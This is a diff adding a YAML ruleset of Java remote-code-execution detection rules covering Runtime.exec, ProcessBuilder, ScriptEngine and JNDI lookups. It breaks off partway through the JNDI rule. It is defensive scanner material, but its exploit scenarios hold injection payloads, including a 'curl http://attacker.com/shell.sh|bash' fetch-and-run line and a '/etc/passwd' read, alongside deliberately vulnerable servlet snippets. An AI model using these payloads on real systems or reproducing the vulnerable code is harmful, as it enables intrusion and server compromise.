@@ -1,0 +1,1201 @@
+# ============================================================================
+# RCE Detection Rules - Java
+# Ruleset Version: 3.0.0
+# Last Updated: 2026-02-28
+# Category: Remote Code Execution (CWE-78, CWE-94)
+# Language: Java
+# ============================================================================
+
+rules:
+  # --------------------------------------------------------------------------
+  # RCE-JAVA-001: Runtime.exec with User-Controlled Input
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JAVA-001"
+    title: "Runtime.exec with User-Controlled Input"
+    description: >
+      Detects usage of Java's Runtime.getRuntime().exec() where the command
+      string or command array includes user-controlled input from servlet
+      request parameters, headers, or request body fields. Runtime.exec()
+      can invoke arbitrary OS commands. When passed a single string, it
+      uses StringTokenizer to split the command (not a shell), but command
+      injection is still possible via argument injection and when the
+      command includes a shell invocation explicitly (/bin/sh -c, cmd.exe /c).
+    language: java
+    category: rce
+    severity: Critical
+    confidence: 0.95
+    cwe: CWE-78
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - command-injection
+      - runtime-exec
+      - java
+      - os-command
+      - servlet
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(\s*(?:request\.getParameter|req\.getParameter)\s*\('
+        description: "Runtime.exec with servlet request parameter"
+      - type: regex
+        pattern: 'Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(\s*(?:cmd|command|userCmd|input|shellCmd|execCmd)\s*\)'
+        description: "Runtime.exec with variable likely from user input"
+      - type: regex
+        pattern: 'Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(\s*(?:".*?"\s*\+\s*(?:request\.|param|input|user|data|cmd))'
+        description: "Runtime.exec with string concatenation of user input"
+      - type: regex
+        pattern: 'Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(\s*new\s+String\s*\[\s*\]\s*\{.*?(?:request\.|param|input|user|cmd)'
+        description: "Runtime.exec with String array containing user input"
+      - type: regex
+        pattern: 'String\s+(?:cmd|command)\s*=\s*(?:request\.getParameter|req\.getParameter)\s*\([^)]+\)\s*;[\s\S]{0,300}Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\('
+        description: "Command from request parameter assigned then used in Runtime.exec"
+      - type: regex
+        pattern: 'Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(\s*new\s+String\s*\[\s*\]\s*\{\s*"(?:/bin/(?:sh|bash)|cmd\.exe)"\s*,\s*"(?:-c|/c)"\s*,\s*(?:cmd|command|input|request\.)'
+        description: "Runtime.exec with explicit shell invocation and user input"
+      - type: regex
+        pattern: 'Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(\s*"(?:ping|nslookup|dig|traceroute|curl|wget|cat|ls)\s+"\s*\+\s*(?:request\.|param|host|ip|target|input)'
+        description: "Runtime.exec with common OS command and user-controlled argument"
+      - type: regex
+        pattern: '(?:Process|Runtime)\s*[\s\S]{0,100}\.exec\s*\(\s*(?:String\.format\s*\(\s*"[^"]*%s[^"]*"\s*,\s*(?:request\.|param|input|user)|request\.getParameter)'
+        description: "Runtime.exec or Process.exec with String.format containing user input"
+    anti_patterns:
+      - 'Runtime\.getRuntime\s*\(\s*\)\.exec\s*\(\s*"[a-zA-Z/]+"\s*\)'
+      - 'Runtime\.getRuntime\s*\(\s*\)\s*\.exec\s*\(\s*(?:COMMAND|CMD|SCRIPT|BIN_PATH)\s*\)'
+      - 'Runtime\.getRuntime\s*\(\s*\)\s*\.exec\s*\(\s*System\.getenv'
+      - '@Test'
+      - 'class\s+\w+Test\s'
+      - 'import\s+org\.(?:junit|mockito|assertj)'
+      - 'Mockito\.\w+'
+      - '@SpringBootTest'
+      - '@MockBean'
+      - 'Runtime\.getRuntime\s*\(\s*\)\s*\.\s*(?:totalMemory|freeMemory|maxMemory|availableProcessors)'
+      - 'Runtime\.getRuntime\s*\(\s*\)\s*\.\s*addShutdownHook'
+    bypass_variants:
+      - description: "Shell invocation via /bin/sh -c for full shell metacharacter support"
+        pattern: 'exec\s*\(\s*new\s+String\s*\[\s*\]\s*\{\s*"(?:/bin/(?:sh|bash)|cmd\.exe)"\s*,\s*"(?:-c|/c)"'
+      - description: "Argument injection via leading dash"
+        pattern: 'exec\s*\(\s*"[a-z]+\s+"\s*\+\s*(?:request\.|param|input)'
+      - description: "Environment variable injection via ProcessBuilder"
+        pattern: 'ProcessBuilder[\s\S]{0,200}environment\s*\(\s*\)[\s\S]{0,200}put\s*\(\s*(?:request\.|param|input)'
+      - description: "Reflection-based Runtime access to bypass filters"
+        pattern: 'Class\.forName\s*\(\s*"java\.lang\.Runtime"\s*\)[\s\S]{0,300}invoke\s*\('
+    evasion_indicators:
+      - "Shell invocation via /bin/sh -c or cmd.exe /c"
+      - "Argument injection via option flags"
+      - "Environment variable injection"
+      - "Reflection to access Runtime.exec indirectly"
+      - "Command separator injection (Unix: ; | &&)"
+    encoding_variants:
+      - type: "url_encoding"
+        pattern: 'exec\s*\(.*?%(?:0[aAdD]|3[bB]|7[cC]|26)'
+      - type: "unicode_escape"
+        pattern: 'exec\s*\(.*?\\u(?:000[aAdD]|003[bB]|007[cC])'
+      - type: "string_format"
+        pattern: 'exec\s*\(\s*String\.format\s*\('
+    multi_function_chain_patterns:
+      - "request.getParameter('cmd') -> Runtime.getRuntime().exec(cmd)"
+      - "@RequestParam cmd -> String[] cmdArr = {'/bin/sh', '-c', cmd} -> exec(cmdArr)"
+      - "servlet -> getParameter -> string concat -> Runtime.exec()"
+      - "Spring controller -> @RequestBody -> command construction -> Runtime.exec()"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "OS command execution enables full system compromise with JVM process privileges"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.getParameter('host')"
+        sink: "Runtime.getRuntime().exec('ping ' + host)"
+        through: "string concatenation in command"
+      - source: "@RequestParam String cmd"
+        sink: "Runtime.getRuntime().exec(cmd)"
+        through: "Spring MVC parameter binding to Runtime.exec"
+      - source: "request.getParameter('file')"
+        sink: "Runtime.getRuntime().exec(new String[]{'/bin/sh', '-c', 'cat ' + file})"
+        through: "shell command with user-controlled argument"
+    impact: |
+      Full remote code execution on the server:
+      - Complete system compromise with JVM process privileges
+      - Data exfiltration from filesystem, databases, and environment
+      - Lateral movement across the internal network
+      - Installation of backdoors and persistent access
+      - Cryptocurrency miners, ransomware deployment
+    remediation: |
+      Avoid Runtime.exec entirely; use ProcessBuilder with argument lists:
+
+      ```java
+      // VULNERABLE:
+      Runtime.getRuntime().exec("ping -c 4 " + host);
+
+      // SECURE: ProcessBuilder with validated argument list
+      Pattern HOSTNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9][a-zA-Z0-9.\\-]+$");
+      if (!HOSTNAME_PATTERN.matcher(host).matches() || host.length() > 253) {
+          throw new IllegalArgumentException("Invalid hostname");
+      }
+      ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
+      pb.redirectErrorStream(true);
+      Process process = pb.start();
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/78.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'class\s+\w+(?:Servlet|Controller|Handler)\s'
+        - 'protected\s+void\s+do(?:Get|Post)\s*\('
+        - '@(?:GetMapping|PostMapping|RequestMapping)'
+        - 'import\s+java\.lang\.Runtime'
+      taint_source_indicators:
+        - 'request\.getParameter\s*\('
+        - 'request\.getHeader\s*\('
+        - '@RequestParam\s+'
+        - '@RequestBody\s+'
+        - '@PathVariable\s+'
+      taint_sink_indicators:
+        - 'Runtime\.getRuntime\s*\(\s*\)\s*\.exec\s*\('
+        - '\.exec\s*\(\s*new\s+String\s*\['
+        - '\.exec\s*\(\s*"'
+      sanitization_patterns:
+        - 'Pattern\.matches\s*\('
+        - 'ALLOWED_COMMANDS'
+        - 'ProcessBuilder\s*\(\s*(?:Arrays\.asList|List\.of)\s*\('
+        - 'validateCommand\s*\('
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + shell_invocation_factor)"
+      exploitability_score: "Critical"
+    exploit_scenario:
+      attack_example: |
+        A servlet provides a network diagnostic tool:
+
+        protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
+            String host = req.getParameter("host");
+            Process p = Runtime.getRuntime().exec("ping -c 4 " + host);
+        }
+
+        With explicit shell invocation:
+        String[] cmd = {"/bin/sh", "-c", "ping -c 4 " + host};
+        Runtime.getRuntime().exec(cmd);
+
+        Attacker sends: host=8.8.8.8;id
+        Shell executes both ping and id.
+      example_payload: "8.8.8.8;cat /etc/passwd"
+      attacker_objective: "Execute arbitrary OS commands via Runtime.exec"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2026-02-28"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JAVA-002"
+        - "RCE-JAVA-003"
+
+  # --------------------------------------------------------------------------
+  # RCE-JAVA-002: ProcessBuilder with Tainted Arguments
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JAVA-002"
+    title: "ProcessBuilder with User-Controlled Arguments"
+    description: >
+      Detects usage of Java's ProcessBuilder where command arguments are
+      derived from user-controlled input. While ProcessBuilder with argument
+      lists avoids direct shell injection (unlike Runtime.exec with a single
+      string), it is still dangerous when user input controls the command
+      name, arguments, or environment variables. Argument injection attacks
+      can exploit option flags in target programs, and explicitly invoking
+      a shell with user input enables full command injection.
+    language: java
+    category: rce
+    severity: Critical
+    confidence: 0.93
+    cwe: CWE-78
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - command-injection
+      - processbuilder
+      - java
+      - os-command
+      - argument-injection
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'new\s+ProcessBuilder\s*\(\s*(?:Arrays\.asList|List\.of)\s*\([^)]*(?:request\.getParameter|req\.getParameter|param|input|user|cmd|command)'
+        description: "ProcessBuilder with argument list containing user input"
+      - type: regex
+        pattern: 'new\s+ProcessBuilder\s*\(\s*(?:cmd|command|args|commandLine|execArgs|userCmd)\s*\)'
+        description: "ProcessBuilder with variable likely from user input"
+      - type: regex
+        pattern: 'new\s+ProcessBuilder\s*\(\s*(?:"(?:/bin/(?:sh|bash)|cmd\.exe)"\s*,\s*"(?:-c|/c)"\s*,\s*(?:request\.|param|input|cmd|command|user))'
+        description: "ProcessBuilder with shell invocation and user input"
+      - type: regex
+        pattern: 'ProcessBuilder\s+\w+\s*=\s*new\s+ProcessBuilder\s*\([^)]*\)\s*;[\s\S]{0,200}\w+\s*\.\s*command\s*\(\s*\)\s*\.\s*add\s*\(\s*(?:request\.|param|input|user)'
+        description: "ProcessBuilder with add() using user input"
+      - type: regex
+        pattern: 'String\s+(?:cmd|command)\s*=\s*(?:request\.getParameter|req\.getParameter)\s*\([^)]+\)\s*;[\s\S]{0,300}new\s+ProcessBuilder\s*\('
+        description: "Request parameter stored then used in ProcessBuilder"
+      - type: regex
+        pattern: 'new\s+ProcessBuilder\s*\([^)]*\)[\s\S]{0,200}\.environment\s*\(\s*\)[\s\S]{0,200}\.put\s*\(\s*(?:request\.|param|key|name|user)'
+        description: "ProcessBuilder environment manipulation with user input"
+    anti_patterns:
+      - 'new\s+ProcessBuilder\s*\(\s*(?:Arrays\.asList|List\.of)\s*\(\s*"[a-zA-Z/]+"\s*\)\s*\)'
+      - 'new\s+ProcessBuilder\s*\(\s*"[a-zA-Z/]+"\s*\)'
+      - '@Test'
+      - 'class\s+\w+Test\s'
+      - 'import\s+org\.(?:junit|mockito)'
+      - 'Mockito\.\w+'
+      - '@SpringBootTest'
+      - '@MockBean'
+      - 'new\s+ProcessBuilder\s*\(\s*"(?:java|javac|mvn|gradle|npm|node)"\s*,'
+      - 'ProcessBuilder.*redirectErrorStream'
+    bypass_variants:
+      - description: "Shell invocation for full metacharacter support"
+        pattern: 'new\s+ProcessBuilder\s*\(\s*(?:"(?:/bin/(?:sh|bash)|cmd\.exe)"\s*,\s*"(?:-c|/c)")'
+      - description: "Argument injection via malicious option flags"
+        pattern: 'new\s+ProcessBuilder\s*\([^)]*(?:request\.|param\.)[\s\S]{0,100}(?:"--[a-z]+=|"-[a-zA-Z]")'
+      - description: "Environment variable injection for library preloading"
+        pattern: '\.environment\s*\(\s*\)\.put\s*\(\s*"(?:LD_PRELOAD|DYLD_INSERT_LIBRARIES|PATH)"'
+      - description: "Working directory traversal"
+        pattern: '\.directory\s*\(\s*new\s+File\s*\(\s*(?:request\.|param|"\.\./")'
+    evasion_indicators:
+      - "Shell invocation via /bin/sh -c"
+      - "Argument injection via leading dashes"
+      - "Environment variable manipulation (LD_PRELOAD, PATH)"
+      - "Working directory traversal"
+      - "Output redirection to sensitive files"
+    encoding_variants:
+      - type: "url_encoding"
+        pattern: 'ProcessBuilder.*?%(?:0[aAdD]|3[bB]|7[cC])'
+      - type: "string_format"
+        pattern: 'ProcessBuilder.*?String\.format\s*\('
+      - type: "char_array"
+        pattern: 'ProcessBuilder.*?new\s+String\s*\(\s*new\s+char\s*\['
+    multi_function_chain_patterns:
+      - "request.getParameter('cmd') -> new ProcessBuilder('/bin/sh', '-c', cmd).start()"
+      - "@RequestParam args -> new ProcessBuilder(args).start()"
+      - "servlet -> getParameter -> command list -> ProcessBuilder -> Process"
+      - "Spring controller -> user input -> ProcessBuilder.command(list) -> start()"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "ProcessBuilder with shell invocation enables full OS command execution"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.getParameter('host')"
+        sink: "new ProcessBuilder('ping', '-c', '4', host).start()"
+        through: "servlet parameter to ProcessBuilder argument"
+      - source: "@RequestParam String cmd"
+        sink: "new ProcessBuilder('/bin/sh', '-c', cmd).start()"
+        through: "Spring parameter to shell command"
+      - source: "request.getParameter('file')"
+        sink: "new ProcessBuilder('cat', file).start()"
+        through: "file path to ProcessBuilder argument"
+    impact: |
+      Arbitrary OS command execution via ProcessBuilder:
+      - Argument injection to manipulate target program behavior
+      - Environment variable poisoning (LD_PRELOAD, PATH)
+      - Working directory manipulation for file access
+      - Full system compromise with JVM process privileges
+    remediation: |
+      Use ProcessBuilder with strict argument validation:
+
+      ```java
+      // VULNERABLE:
+      new ProcessBuilder("/bin/sh", "-c", "convert " + filename).start();
+
+      // SECURE: Validated arguments, no shell
+      Pattern SAFE_FILE = Pattern.compile("^[a-zA-Z0-9._-]+$");
+      if (!SAFE_FILE.matcher(filename).matches()) {
+          throw new IllegalArgumentException("Invalid filename");
+      }
+      ProcessBuilder pb = new ProcessBuilder("convert", filename, "output.pdf");
+      pb.redirectErrorStream(true);
+      Process p = pb.start();
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/78.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/ProcessBuilder.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'class\s+\w+(?:Servlet|Controller|Handler|Service)\s'
+        - 'protected\s+void\s+do(?:Get|Post)\s*\('
+        - '@(?:GetMapping|PostMapping|RequestMapping)'
+        - 'import\s+java\.lang\.ProcessBuilder'
+      taint_source_indicators:
+        - 'request\.getParameter\s*\('
+        - 'request\.getHeader\s*\('
+        - '@RequestParam\s+'
+        - '@RequestBody\s+'
+        - '@PathVariable\s+'
+      taint_sink_indicators:
+        - 'new\s+ProcessBuilder\s*\('
+        - '\.command\s*\('
+        - '\.start\s*\('
+        - '\.environment\s*\(\s*\)\.put\s*\('
+      sanitization_patterns:
+        - 'Pattern\.matches\s*\('
+        - 'ALLOWED_COMMANDS'
+        - 'validateArgument\s*\('
+        - 'SAFE_PATTERN\.matcher\s*\('
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + shell_invocation_factor)"
+      exploitability_score: "Critical"
+    exploit_scenario:
+      attack_example: |
+        A Spring Boot service converts files using ProcessBuilder:
+
+        @PostMapping("/api/convert")
+        public String convert(@RequestParam String filename) {
+            ProcessBuilder pb = new ProcessBuilder(
+                "/bin/sh", "-c", "convert " + filename + " output.pdf");
+            Process p = pb.start();
+            return "Converted";
+        }
+
+        Attacker sends: filename=test.png;curl attacker.com/shell.sh|bash
+        The shell interprets the full string, executing both commands.
+      example_payload: "test.png;curl http://attacker.com/shell.sh|bash"
+      attacker_objective: "Inject OS commands via ProcessBuilder shell invocation"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2026-02-28"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JAVA-001"
+        - "RCE-JAVA-003"
+
+  # --------------------------------------------------------------------------
+  # RCE-JAVA-003: ScriptEngine.eval with User Input
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JAVA-003"
+    title: "ScriptEngine.eval with User-Controlled Script"
+    description: >
+      Detects usage of Java's javax.script.ScriptEngine where the evaluated
+      script code comes from user-controlled input. ScriptEngine supports
+      JavaScript (Nashorn/GraalJS), Groovy, JRuby, Jython, and other
+      languages. Code evaluated via ScriptEngine has access to Java classes
+      via Java.type() or Class.forName(), enabling Runtime.exec(), file
+      I/O, network access, and full JVM compromise from within script
+      evaluation.
+    language: java
+    category: rce
+    severity: High
+    confidence: 0.94
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - scriptengine
+      - nashorn
+      - graaljs
+      - groovy
+      - code-injection
+      - java
+      - eval
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'ScriptEngine\s+\w+[\s\S]{0,300}\.eval\s*\(\s*(?:request\.getParameter|req\.getParameter|param|input|code|script|expression|user)'
+        description: "ScriptEngine.eval with user-controlled code"
+      - type: regex
+        pattern: 'getEngineByName\s*\(\s*"(?:js|javascript|nashorn|graal\.js|groovy|python|ruby|jython)"[\s\S]{0,300}\.eval\s*\(\s*(?:request\.|code|script|input|user)'
+        description: "Named ScriptEngine with user-controlled evaluation"
+      - type: regex
+        pattern: '(?:Invocable|Compilable)\s*[\s\S]{0,200}\.(?:invokeFunction|invokeMethod|compile)\s*\(\s*(?:request\.|code|script|funcName|methodName|input|user)'
+        description: "ScriptEngine invocation or compilation with user input"
+      - type: regex
+        pattern: '(?:GroovyShell|GroovyScriptEngine)\s*[\s\S]{0,200}\.(?:evaluate|parse|run)\s*\(\s*(?:request\.|code|script|input|user)'
+        description: "GroovyShell evaluation with user-controlled code"
+      - type: regex
+        pattern: 'String\s+(?:code|script|expression)\s*=\s*request\s*\.(?:getParameter|getHeader)\s*\([^)]+\)\s*;[\s\S]{0,300}(?:engine|scriptEngine)\s*\.\s*eval\s*\('
+        description: "Script from request parameter used in ScriptEngine.eval"
+    anti_patterns:
+      - '\.eval\s*\(\s*"[^"]*"\s*\)\s*;'
+      - '\.eval\s*\(\s*(?:SCRIPT|CODE|EXPRESSION|Constants\.)\s*\)'
+      - '@Test'
+      - 'class\s+\w+Test\s'
+      - 'import\s+org\.(?:junit|mockito)'
+      - 'Mockito\.\w+'
+      - '@SpringBootTest'
+      - '@MockBean'
+      - '\.eval\s*\(\s*new\s+FileReader\s*\(\s*"[^"]*"\s*\)\s*\)'
+    bypass_variants:
+      - description: "Java.type() in Nashorn/GraalJS for class access"
+        pattern: '\.eval\s*\([^)]*Java\.type\s*\(\s*[`\x27"]java\.lang\.Runtime'
+      - description: "Class.forName for reflective class loading"
+        pattern: '\.eval\s*\([^)]*Class\.forName\s*\('
+      - description: "Groovy execute() method for command execution"
+        pattern: '\.eval\s*\([^)]*(?:\.execute\s*\(\s*\)|"[^"]+"\s*\.execute\s*\(\s*\))'
+      - description: "ProcessBuilder via script for command execution"
+        pattern: '\.eval\s*\([^)]*ProcessBuilder'
+    evasion_indicators:
+      - "Java.type() for JVM class access from JavaScript"
+      - "Groovy's .execute() method on strings"
+      - "Class.forName for reflective access"
+      - "Importing Java classes within script"
+      - "ProcessBuilder construction from evaluated code"
+    encoding_variants:
+      - type: "unicode_escape"
+        pattern: '\.eval\s*\(.*?\\u[0-9A-Fa-f]{4}'
+      - type: "base64_decode"
+        pattern: '\.eval\s*\(\s*new\s+String\s*\(\s*Base64\.\w+\.decode'
+      - type: "string_concat"
+        pattern: '\.eval\s*\(\s*"[^"]*"\s*\+\s*"[^"]*"\s*\+\s*(?:request\.|param|input)'
+    multi_function_chain_patterns:
+      - "request.getParameter('code') -> engine.eval(code) -> Java.type access -> RCE"
+      - "@RequestBody code -> GroovyShell.evaluate(code) -> 'cmd'.execute()"
+      - "user input -> ScriptEngine.eval -> Class.forName -> Runtime.exec"
+      - "API endpoint -> expression -> Compilable.compile(expr) -> eval()"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "ScriptEngine provides full JVM access via Java interop in scripting languages"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "request.getParameter('expression')"
+        sink: "engine.eval(expression)"
+        through: "servlet parameter to ScriptEngine.eval"
+      - source: "@RequestBody String code"
+        sink: "new GroovyShell().evaluate(code)"
+        through: "request body to GroovyShell evaluation"
+      - source: "request.getParameter('formula')"
+        sink: "engine.eval(formula)"
+        through: "formula parameter to script evaluation"
+    impact: |
+      Arbitrary code execution via Java interop in scripting languages:
+      - Access to Runtime.exec, ProcessBuilder for OS commands
+      - File system read/write via java.io.* classes
+      - Network access via java.net.* classes
+      - Full JVM and system compromise
+    remediation: |
+      Do not use ScriptEngine.eval with user input:
+
+      ```java
+      // VULNERABLE:
+      engine.eval(userExpression);
+
+      // SECURE: Use a purpose-built expression evaluator for math
+      import net.objecthunter.exp4j.ExpressionBuilder;
+      if (!expression.matches("[0-9+\\-*/().\\s]+")) {
+          throw new IllegalArgumentException("Invalid expression");
+      }
+      Expression exp = new ExpressionBuilder(expression).build();
+      double result = exp.evaluate();
+
+      // For business rules, use a dedicated rules engine (Drools, Easy Rules)
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://docs.oracle.com/en/java/javase/17/docs/api/java.scripting/javax/script/ScriptEngine.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'import\s+javax\.script\.'
+        - 'ScriptEngineManager'
+        - 'class\s+\w+(?:Controller|Service|Handler)\s'
+        - '@(?:GetMapping|PostMapping|RequestMapping)'
+        - 'import\s+groovy\.lang\.'
+      taint_source_indicators:
+        - 'request\.getParameter\s*\('
+        - '@RequestParam\s+'
+        - '@RequestBody\s+'
+        - 'request\.getHeader\s*\('
+      taint_sink_indicators:
+        - '\.eval\s*\('
+        - '\.evaluate\s*\('
+        - '\.invokeFunction\s*\('
+        - '\.compile\s*\('
+        - 'GroovyShell.*evaluate\s*\('
+      sanitization_patterns:
+        - 'ClassFilter'
+        - 'exp4j'
+        - 'ExpressionBuilder'
+        - 'ALLOWED_FUNCTIONS'
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (1 + java_interop_risk)"
+      exploitability_score: "Critical"
+    exploit_scenario:
+      attack_example: |
+        A Java application evaluates user expressions:
+
+        @PostMapping("/api/eval")
+        public String evaluate(@RequestParam String expression) {
+            ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
+            Object result = engine.eval(expression);
+            return result.toString();
+        }
+
+        Attacker sends:
+        POST /api/eval?expression=var Runtime = Java.type('java.lang.Runtime');
+        Runtime.getRuntime().exec('id')
+      example_payload: "var Runtime = Java.type('java.lang.Runtime'); Runtime.getRuntime().exec('id')"
+      attacker_objective: "Execute arbitrary Java/OS code via ScriptEngine evaluation"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2026-02-28"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JAVA-001"
+        - "RCE-JAVA-004"
+        - "RCE-JAVA-005"
+
+  # --------------------------------------------------------------------------
+  # RCE-JAVA-004: JNDI Lookup Injection
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JAVA-004"
+    title: "JNDI InitialContext.lookup with User-Controlled Name"
+    description: >
+      Detects usage of Java's JNDI (Java Naming and Directory Interface)
+      InitialContext.lookup() where the lookup name is derived from user-
+      controlled input. JNDI lookup with protocols like ldap://, rmi://,
+      dns://, or iiop:// can be exploited to load remote objects, triggering
+      arbitrary code execution via deserialization or remote class loading.
+      This is the same class of vulnerability exploited by Log4Shell
+      (CVE-2021-44228) and remains a critical RCE vector in Java.
+    language: java
+    category: rce
+    severity: Critical
+    confidence: 0.95
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - jndi
+      - jndi-injection
+      - ldap
+      - rmi
+      - log4shell
+      - deserialization
+      - java
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: '(?:InitialContext|Context)\s*[\s\S]{0,200}\.lookup\s*\(\s*(?:request\.getParameter|req\.getParameter|param|input|name|jndiName|user|data)'
+        description: "JNDI lookup with user-controlled name"
+      - type: regex
+        pattern: 'new\s+InitialContext\s*\(\s*\)[\s\S]{0,200}\.lookup\s*\(\s*(?:request\.|name|uri|url|input|user|data|jndi)'
+        description: "InitialContext.lookup with user-controlled name"
+      - type: regex
+        pattern: '(?:ctx|context)\s*\.\s*lookup\s*\(\s*"(?:ldap|rmi|ldaps|dns|iiop|corba)://"\s*\+\s*(?:request\.|param|input|user|data)'
+        description: "JNDI lookup with user-controlled LDAP/RMI URL"
+      - type: regex
+        pattern: 'String\s+(?:jndiName|lookupName|name)\s*=\s*(?:request\.getParameter|req\.getParameter)\s*\([^)]+\)\s*;[\s\S]{0,300}\.lookup\s*\('
+        description: "JNDI name from request parameter used in lookup"
+      - type: regex
+        pattern: 'NamingManager\s*\.\s*(?:getObjectInstance|getInitialContext)\s*\([^)]*(?:request\.|input|user|data|name)'
+        description: "NamingManager with user-controlled input"
+      - type: regex
+        pattern: '(?:DirContext|LdapContext)\s*[\s\S]{0,200}\.(?:lookup|search|getAttributes)\s*\(\s*(?:request\.|name|dn|filter|input|user)'
+        description: "Directory context operations with user-controlled input"
+      - type: regex
+        pattern: 'JndiTemplate\s*[\s\S]{0,200}\.lookup\s*\(\s*(?:request\.|name|uri|input|user|data|jndi)'
+        description: "Spring JndiTemplate lookup with user-controlled name"
+    anti_patterns:
+      - '\.lookup\s*\(\s*"java:(?:comp|global|module|app)/'
+      - '\.lookup\s*\(\s*"(?:jdbc|jms|mail|bean)/'
+      - '\.lookup\s*\(\s*(?:JNDI_NAME|DATA_SOURCE|JMS_QUEUE|Constants\.)\s*\)'
+      - '@Test'
+      - 'class\s+\w+Test\s'
+      - 'import\s+org\.(?:junit|mockito)'
+      - 'Mockito\.\w+'
+      - '@SpringBootTest'
+      - '@MockBean'
+      - '\.lookup\s*\(\s*"CN='
+    bypass_variants:
+      - description: "LDAP referral to external code base"
+        pattern: '\.lookup\s*\(\s*"ldap://[^"]*(?:request\.|param|input|user)'
+      - description: "RMI registry pointing to malicious codebase"
+        pattern: '\.lookup\s*\(\s*"rmi://[^"]*(?:request\.|param|input|user)'
+      - description: "Serialized object in LDAP entry (javaSerializedData)"
+        pattern: '(?:javaSerializedData|javaCodeBase|javaClassName|javaFactory)'
+      - description: "Log4j style JNDI injection via logging"
+        pattern: '(?:log|logger|LOG)\s*\.\s*(?:info|error|debug|warn)\s*\(\s*(?:request\.|input|user|data|param)'
+    evasion_indicators:
+      - "LDAP/RMI URL with external server"
+      - "Serialized Java object in LDAP response"
+      - "Remote codebase URL in LDAP attributes"
+      - "Log4j-style ${jndi:ldap://...} injection"
+      - "DNS tunneling via JNDI DNS provider"
+    encoding_variants:
+      - type: "url_encoding"
+        pattern: '\.lookup\s*\(.*?%(?:24|7[bB]|6[aA]|6[eE]).*?(?:jndi|ldap|rmi)'
+      - type: "unicode_escape"
+        pattern: '\.lookup\s*\(.*?\\u(?:006[aA]|006[eE]|0064|0069)'
+      - type: "nested_lookup"
+        pattern: '\.lookup\s*\(.*?\$\{[^}]*\$\{[^}]*\}'
+    multi_function_chain_patterns:
+      - "request.getParameter('name') -> ctx.lookup(name) -> remote object deserialization"
+      - "user input -> JNDI URL construction -> InitialContext.lookup -> class loading"
+      - "HTTP header -> log message -> Log4j -> JNDI lookup -> RCE"
+      - "user input -> LDAP search filter -> directory lookup -> code execution"
+    privilege_context_flags:
